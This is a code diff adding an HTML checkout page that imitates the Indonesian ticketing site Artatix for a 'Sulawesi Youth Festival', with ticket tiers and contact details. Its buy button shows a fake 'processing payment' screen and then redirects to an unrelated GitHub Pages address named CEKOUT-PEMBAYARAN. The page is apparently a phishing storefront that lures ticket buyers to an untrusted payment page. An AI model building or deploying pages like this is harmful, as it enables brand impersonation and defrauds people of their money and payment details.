@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout: Sulawesi Youth Festival | Artatix</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+background:#f5f6fa;
+color:#111827;
+padding-bottom:140px;
+}
+
+/* HEADER */
+
+.header{
+padding:18px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+max-width:480px;
+margin:auto;
+}
+
+.logo{
+font-size:26px;
+font-weight:800;
+color:#2d47d9;
+}
+
+.lang{
+background:#eceff4;
+padding:10px 18px;
+border-radius:18px;
+font-size:15px;
+font-weight:600;
+}
+
+/* STEP */
+
+.step-wrap{
+display:flex;
+align-items:center;
+gap:12px;
+padding:0 18px;
+margin-bottom:22px;
+max-width:480px;
+margin-inline:auto;
+overflow:auto;
+}
+
+.step{
+display:flex;
+align-items:center;
+gap:10px;
+white-space:nowrap;
+}
+
+.step-circle{
+width:34px;
+height:34px;
+border-radius:50%;
+border:2px solid #cbd5e1;
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:700;
+font-size:14px;
+background:white;
+color:#64748b;
+}
+
+.step.active .step-circle{
+border-color:#4263eb;
+color:#4263eb;
+}
+
+.step-text{
+font-size:15px;
+font-weight:600;
+}
+
+.arrow{
+font-size:22px;
+color:#94a3b8;
+}
+
+/* BANNER */
+
+.banner{
+padding:0 18px;
+margin-bottom:24px;
+max-width:480px;
+margin-inline:auto;
+}
+
+.banner img{
+width:100%;
+border-radius:20px;
+display:block;
+}
+
+/* SECTION */
+
+.section-title{
+display:flex;
+align-items:center;
+gap:12px;
+padding:0 18px;
+font-size:22px;
+font-weight:700;
+margin-bottom:18px;
+max-width:480px;
+margin-inline:auto;
+}
+
+/* TICKET */
+
+.ticket-list{
+padding:0 18px;
+display:flex;
+flex-direction:column;
+gap:18px;
+max-width:480px;
+margin:auto;
+}
+
+.ticket-card{
+position:relative;
+background:white;
+border:1px solid #e5e7eb;
+border-radius:22px;
+padding:22px;
+box-shadow:0 4px 12px rgba(0,0,0,.03);
+}
+
+.ticket-top{
+display:flex;
+justify-content:space-between;
+align-items:center;
+gap:12px;
+margin-bottom:16px;
+}
+
+.ticket-name{
+font-size:19px;
+font-weight:700;
+}
+
+.status{
+padding:7px 12px;
+border-radius:10px;
+font-size:12px;
+font-weight:700;
+}
+
+.soldout{
+background:#ffecec;
+color:#dc2626;
+}
+
+.onsale{
+background:#e7fff1;
+color:#16a34a;
+}
+
+.ticket-price{
+font-size:28px;
+font-weight:800;
+margin-bottom:14px;
+}
+
+.ticket-desc{
+font-size:14px;
+line-height:1.9;
+color:#4b5563;
+}
+
+/* FLOATING */
+
+.bottom-bar{
+position:fixed;
+left:0;
+right:0;
+bottom:0;
+background:white;
+padding:18px;
+box-shadow:0 -8px 30px rgba(0,0,0,.08);
+z-index:999;
+}
+
+.bottom-inner{
+max-width:480px;
+margin:auto;
+}
+
+.bottom-top{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:14px;
+}
+
+.bottom-label{
+font-size:14px;
+font-weight:600;
+color:#6b7280;
+}
+
+.bottom-price{
+font-size:22px;
+font-weight:800;
+}
+
+.selectable{
+cursor:pointer;
+transition:.3s;
+}
+
+.selectable:hover{
+transform:translateY(-3px);
+border-color:#4c6fff;
+}
+
+.ticket-selected{
+border:2px solid #4c6fff;
+background:#eef2ff;
+}
+
+.buy-btn{
+width:100%;
+height:56px;
+border:none;
+border-radius:18px;
+background:#4c6fff;
+color:white;
+font-size:18px;
+font-weight:700;
+cursor:pointer;
+transition:.3s;
+}
+
+.buy-btn:hover{
+transform:scale(1.02);
+}
+
+/* LOADING */
+
+.loading-screen{
+position:fixed;
+inset:0;
+background:#0f172a;
+display:none;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+z-index:99999;
+}
+
+.loader-ring{
+width:90px;
+height:90px;
+border:7px solid rgba(255,255,255,.15);
+border-top:7px solid #4c6fff;
+border-radius:50%;
+animation:spin 1s linear infinite;
+margin-bottom:28px;
+}
+
+.loading-text{
+color:white;
+font-size:18px;
+font-weight:600;
+text-align:center;
+line-height:1.8;
+padding:0 20px;
+}
+
+@keyframes spin{
+100%{
+transform:rotate(360deg);
+}
+}
+
+/* FOOTER */
+
+.footer{
+padding:40px 20px 180px;
+text-align:center;
+font-size:14px;
+line-height:2;
+color:#6b7280;
+}
+
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+
+<div class="header">
+
+<div class="logo">
+Artatix
+</div>
+
+<div class="lang">
+🇮🇩 ID
+</div>
+
+</div>
+
+<!-- STEP -->
+
+<div class="step-wrap">
+
+<div class="step active">
+<div class="step-circle">1</div>
+<div class="step-text">Pilih Kategori</div>
+</div>
+
+<div class="arrow">›</div>
+
+<div class="step">
+<div class="step-circle">2</div>
+</div>
+
+<div class="arrow">›</div>
+
+<div class="step">
+<div class="step-circle">3</div>
+</div>
+
+<div class="arrow">›</div>
+
+<div class="step">
+<div class="step-circle">4</div>
+</div>
+
+</div>
+
+<!-- BANNER -->
+
+<div class="banner">
+<img src="banner.png">
+</div>
+
+<!-- TITLE -->
+
+<div class="section-title">
+🎟️ Kategori Tiket
+</div>
+
+<!-- TICKETS -->
+
+<div class="ticket-list">
+
+<div class="ticket-card">
+<div class="ticket-top">
+<div class="ticket-name">Early Bird</div>
+<div class="status soldout">Sold Out</div>
+</div>
+<div class="ticket-price">Rp133.000</div>
+<div class="ticket-desc">
+Tiket yang sudah dibeli tidak dapat dikembalikan kecuali ada pembatalan acara oleh penyelenggara.
+</div>
+</div>
+
+<div class="ticket-card">
+<div class="ticket-top">
+<div class="ticket-name">PRESALE</div>
+<div class="status soldout">Sold Out</div>
+</div>
+<div class="ticket-price">Rp163.000</div>
+<div class="ticket-desc">
+Pengunjung wajib mematuhi aturan keamanan dan ketentuan konser.
+</div>
+</div>
+
+<div class="ticket-card">
+<div class="ticket-top">
+<div class="ticket-name">PRESALE 2 FEST B</div>
+<div class="status soldout">Sold Out</div>
+</div>
+<div class="ticket-price">Rp193.000</div>
+<div class="ticket-desc">
+Dilarang melakukan rekaman komersial tanpa izin.
+</div>
+</div>
+
+<div class="ticket-card">
+<div class="ticket-top">
+<div class="ticket-name">PRESALE 2 FEST A</div>
+<div class="status soldout">Sold Out</div>
+</div>
+<div class="ticket-price">Rp223.000</div>
+<div class="ticket-desc">
+Penyelenggara tidak bertanggung jawab atas kehilangan barang pribadi.
+</div>
+</div>
+
+<div class="ticket-card selectable" onclick="selectTicket('FEST B LAST CALL','Rp243.000',this)">
+<div class="ticket-top">
+<div class="ticket-name">FEST B LAST CALL</div>
+<div class="status onsale">On Sale</div>
+</div>
+<div class="ticket-price">Rp243.000</div>
+<div class="ticket-desc">
+Tiket last call untuk area Festival B masih tersedia.
+</div>
+</div>
+
+<div class="ticket-card selectable" onclick="selectTicket('FEST A LAST CALL','Rp293.000',this)">
+<div class="ticket-top">
+<div class="ticket-name">FEST A LAST CALL</div>
+<div class="status onsale">On Sale</div>
+</div>
+<div class="ticket-price">Rp293.000</div>
+<div class="ticket-desc">
+Tiket last call area Festival A dengan akses premium.
+</div>
+</div>
+
+</div>
+
+<!-- FOOTER -->
+
+<div class="footer">
++62 821-3767-6220<br>
+cs@artatix.co.id<br><br>
+© 2026 Artatix. Hak Cipta Dilindungi.
+</div>
+
+<!-- FLOATING -->
+
+<div class="bottom-bar">
+
+<div class="bottom-inner">
+
+<div class="bottom-top">
+<div class="bottom-label">Harga Mulai dari</div>
+<div class="bottom-price" id="selectedPrice">Rp 133.000</div>
+</div>
+
+<button class="buy-btn" onclick="startLoading()">
+Beli Sekarang
+</button>
+
+</div>
+
+</div>
+
+<!-- LOADING -->
+
+<div class="loading-screen" id="loadingScreen">
+
+<div class="loader-ring"></div>
+
+<div class="loading-text">
+Memproses Pembayaran...<br>
+Mohon Tunggu Sebentar
+</div>
+
+</div>
+
+<script>
+
+let selectedTicket = 'FEST B LAST CALL';
+
+function selectTicket(name,price,element){
+
+selectedTicket = name;
+
+document.querySelectorAll('.selectable').forEach(card=>{
+card.classList.remove('ticket-selected');
+});
+
+element.classList.add('ticket-selected');
+
+document.getElementById('selectedPrice').innerText = price;
+
+}
+
+function startLoading(){
+
+const loading = document.getElementById('loadingScreen');
+loading.style.display = 'flex';
+
+setTimeout(()=>{
+window.location.href='https://eticketdigital.github.io/CEKOUT-PEMBAYARAN/';
+},5000);
+
+}
+
+</script>
+
+</body>
+</html>
